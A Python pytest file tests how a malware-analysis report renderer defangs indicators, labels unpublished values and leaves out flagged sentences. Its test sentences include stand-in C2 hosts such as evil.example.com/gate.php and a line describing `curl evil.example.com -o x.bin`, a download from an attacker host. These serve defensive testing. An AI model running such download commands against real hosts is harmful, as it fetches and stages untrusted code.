"""The analyst report prints a sentence a check left standing as the platform decides (T-555).

A sentence flagged only for a value the run does not publish stands with the
platform's fixed state after each such value, in place of any bracket the model
wrote on its publication; one flagged only for a confidence
written as a number stands with the confidence in words; any other is left
out, and the section says how many it left out. A value only a left-out
sentence names brings no replaced text back; a closing section every sentence
of which was left out says so and never falls back to the words it replaced;
the judge's answer when asked is the bundle's. The bundle prints each sentence
with its mark. Every value is a neutral one.
"""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from maljan.reporting.defang import defang
from maljan.reporting.models import (
    CapabilityBullet,
    CapabilityCell,
    Conclusion,
    FileHashes,
    FlaggedStatement,
    KeyFinding,
    MalwareReport,
    SampleIdentity,
    TechnicalAnalysis,
    TechnicalSubsection,
)
from maljan.reporting.renderers.analyst import UNPUBLISHED_STATE, _with_unpublished_state
from maljan.reporting.renderers.layout import ANALYST, BUNDLE
from maljan.reporting.renderers.markdown import MarkdownRenderer
from maljan.schemas.isr_models import judge_kept_note

UNPUBLISHED = "The beacon also reaches 192.0.2.7 on port 80."
PROCESS = "The ledger holds no listing of 0x5030."
NUMERIC = "It is malware with confidence 0.95."


def _report(**ta: object) -> MalwareReport:
    return MalwareReport(
        identity=SampleIdentity(hashes=FileHashes(sha256="ef" * 32), file_name="sample.exe"),
        verdict="Malware",
        generated_at=datetime(2026, 1, 1, tzinfo=UTC),
        technical_analysis=TechnicalAnalysis(**ta),
    )


def _analyst(report: MalwareReport) -> str:
    return MarkdownRenderer(layout=ANALYST).render(report)


def _section(markdown: str, heading: str) -> str:
    return markdown.split(heading, 1)[1].split("\n## ", 1)[0]


def _c2(sentence: str) -> str:
    report = _report(
        command_and_control=TechnicalSubsection(title="C2", body=f"It beacons. {sentence}")
    )
    report.flagged_statements = [
        FlaggedStatement(sentence=sentence, code="report.unpublished_value", label="x")
    ]
    c2 = _section(_analyst(report), "## 6. Command and control")
    assert "**[" not in c2 and "left out" not in c2
    assert "**[not published by this run: x" in MarkdownRenderer(layout=BUNDLE).render(report)
    return c2


# The model's brackets on a value's publication, each contradicting the IOC table
# somewhere; whatever they say, the platform's own state replaces them.
CONTRADICTING = [
    (
        "8.8.8.8",
        "(a published indicator; the sandbox report does say which process made the flows, "
        "no doubt)",
    ),
    (
        "8.8.8.8",
        "(published indicator, though the sandbox report does not say which process made the "
        "flows)",
    ),
    ("c.pki.goog", "(a row of this run's IOC table, no doubt)"),
    ("c.pki.goog", "(published: it is a row of this run's IOC table; not benign)"),
    ("8.8.8.8", "(a published indicator, not exported to STIX)"),
]


@pytest.mark.parametrize(("value", "bracket"), CONTRADICTING)
def test_the_model_s_bracket_on_publication_gives_way_to_the_platform_s_state(
    value: str, bracket: str
) -> None:
    c2 = _c2(f"The flow goes to {value} {bracket} at start.")
    shown = defang(value, "ip" if value[0].isdigit() else "domain")
    assert f"The flow goes to {shown} ({UNPUBLISHED_STATE}) at start." in c2
    # Nothing of the model's bracket is left: the state is the platform's alone.
    line = next(line for line in c2.splitlines() if "The flow goes to" in line)
    assert line == f"It beacons. The flow goes to {shown} ({UNPUBLISHED_STATE}) at start."


def test_a_bare_value_is_given_the_platform_s_state() -> None:
    c2 = _c2(UNPUBLISHED)
    assert f"192[.]0[.]2[.]7 ({UNPUBLISHED_STATE}) on port 80." in c2


def test_a_bracket_not_on_publication_stays_with_the_state_after_it() -> None:
    c2 = _c2("The beacon also reaches 192.0.2.7 (UDP 53) at start.")
    assert f"192[.]0[.]2[.]7 (UDP 53) ({UNPUBLISHED_STATE}) at start." in c2


STATE = f"({UNPUBLISHED_STATE})"


# Each value is placed as a whole token, in any case, after its enclosing token.
@pytest.mark.parametrize(
    ("sentence", "printed"),
    [
        (
            "It contacts 18.8.8.81 and 8.8.8.8.",
            f"It contacts 18[.]8[.]8[.]81 {STATE} and 8[.]8[.]8[.]8 {STATE}.",
        ),
        (
            "It fetches https://evil.example.com/gate.php from evil.example.com.",
            f"It fetches hxxps://evil[.]example[.]com/gate.php from evil[.]example[.]com {STATE}.",
        ),
        (
            "It reaches notevil.example.com and evil.example.com.",
            f"It reaches notevil[.]example[.]com {STATE} and evil[.]example[.]com {STATE}.",
        ),
        (
            "It resolves `evil.example.com` at start.",
            f"It resolves `evil[.]example[.]com` {STATE} at start.",
        ),
        (
            "It resolves 'evil.example.com' at start.",
            f"It resolves 'evil[.]example[.]com' {STATE} at start.",
        ),
        (
            "It resolves EVIL.example.com at start.",
            f"It resolves EVIL[.]example[.]com {STATE} at start.",
        ),
        # A host standing only in a URL or a path: the state after the whole of it.
        (
            "It fetches https://evil.example.com/gate.php over HTTPS.",
            f"It fetches hxxps://evil[.]example[.]com/gate.php {STATE} over HTTPS.",
        ),
        (
            "After the wait it reaches evil.example.com/gate.",
            f"After the wait it reaches evil[.]example[.]com/gate {STATE}.",
        ),
        # Inside a code span or a quotation with spaces: the state after its close.
        (
            "It runs `curl evil.example.com -o x.bin` at start.",
            f"It runs `curl evil[.]example[.]com -o x.bin` {STATE} at start.",
        ),
        (
            'The string "connect to evil.example.com now" is decoded.',
            f'The string "connect to evil[.]example[.]com now" {STATE} is decoded.',
        ),
    ],
)
def test_the_state_is_written_after_the_whole_token(sentence: str, printed: str) -> None:
    line = next(line for line in _c2(sentence).splitlines() if line.startswith("It beacons."))
    assert line == f"It beacons. {printed}"


def test_a_value_standing_nowhere_leaves_its_sentence_out() -> None:
    # Inside a longer address, or not in the sentence at all.
    assert _with_unpublished_state("It contacts 18.8.8.81.", ["8.8.8.8"]) is None
    assert _with_unpublished_state("It contacts notevil.example.com.", ["evil.example.com"]) is None
    assert _with_unpublished_state("It contacts 192.0.2.7.", ["evil.example.com"]) is None


def test_a_numeric_confidence_is_worded_and_another_flag_leaves_its_sentence_out() -> None:
    report = _report(
        packing_obfuscation=TechnicalSubsection(
            title="Packing", body=f"It packs. {NUMERIC} {PROCESS}"
        )
    )
    report.flagged_statements = [
        FlaggedStatement(sentence=NUMERIC, code="report.numeric_confidence", label="0.95"),
        FlaggedStatement(sentence=PROCESS, code="report.process_words", label="ledger"),
    ]
    functionality = _section(_analyst(report), "## 5. Functionality")
    assert "It packs. It is malware with high confidence." in functionality
    assert "0.95" not in functionality and "0x5030" not in functionality
    assert "_1 sentence of this section was left out; the bundle lists each with the reason._" in (
        functionality
    )


def test_a_value_only_a_left_out_sentence_names_brings_no_finding_back() -> None:
    sentence = "The ledger shows it reaches 192.0.2.9."
    report = _report(
        capability_summary=[CapabilityBullet(text="The sample beacons.")],
        command_and_control=TechnicalSubsection(title="C2", body=f"It beacons. {sentence}"),
    )
    report.key_findings = [KeyFinding(text="It contacts 192.0.2.9.")]
    report.flagged_statements = [
        FlaggedStatement(sentence=sentence, code="report.process_words", label="ledger")
    ]
    summary = _section(_analyst(report), "## 1. Executive summary")
    assert "192[.]0[.]2[.]9" not in summary and "192.0.2.9" not in summary


def test_a_closing_section_left_out_whole_says_so_and_never_falls_back() -> None:
    report = _report(
        analyst_conclusion=TechnicalSubsection(title="Conclusion", body=PROCESS),
        analyst_limitations=TechnicalSubsection(title="Limitations", body=""),
    )
    report.conclusion = Conclusion(text="The judge's own unchecked words.")
    report.flagged_statements = [
        FlaggedStatement(sentence=PROCESS, code="report.process_words", label="ledger")
    ]
    report.run_summary = {
        "validation": {
            "unresolved": [
                {"code": "agreement.dropped", "message": "left out", "subject": "limitations"}
            ]
        }
    }
    markdown = _analyst(report)
    conclusion = _section(markdown, "## 7. Conclusion")
    assert "The conclusion the report model wrote was left out" in conclusion
    assert "unchecked words" not in conclusion
    assert "_1 sentence of this section was left out" in conclusion
    limitations = _section(markdown, "## 11. Limitations")
    assert "The limitations the report model wrote were left out" in limitations
    assert "The run recorded no limitation." not in limitations
    assert "_1 sentence of this section was left out" in limitations


def test_the_judge_s_answer_when_asked_is_the_bundle_s() -> None:
    report = _report()
    report.capability_matrix = [
        CapabilityCell(
            tactic="TA0005",
            tactic_name="Defense Evasion",
            technique_id="T1140",
            technique_name="Deobfuscate/Decode Files or Information",
            evidence=["Routine 0xae78 decodes the strings."],
            note=judge_kept_note("the listing shows the decoder"),
        )
    ]
    attack = _section(_analyst(report), "## 10. MITRE ATT&CK mapping")
    assert "| T1140 |" in attack and "kept by the judge" not in attack
    assert "kept by the judge when asked" in MarkdownRenderer(layout=BUNDLE).render(report)


def test_a_flagged_first_sentence_with_its_citations_is_found_and_left_out() -> None:
    claim = "Encrypts each file with ChaCha20 [ev_0002]."
    report = _report()
    report.capability_matrix = [
        CapabilityCell(
            tactic="TA0040",
            tactic_name="Impact",
            technique_id="T1486",
            technique_name="Data Encrypted for Impact",
            evidence=[claim],
        )
    ]
    report.flagged_statements = [
        FlaggedStatement(sentence=claim, code="report.process_words", label="x")
    ]
    row = next(line for line in _analyst(report).splitlines() if "| T1486 |" in line)
    assert "ChaCha20" not in row and row.endswith("| - |")
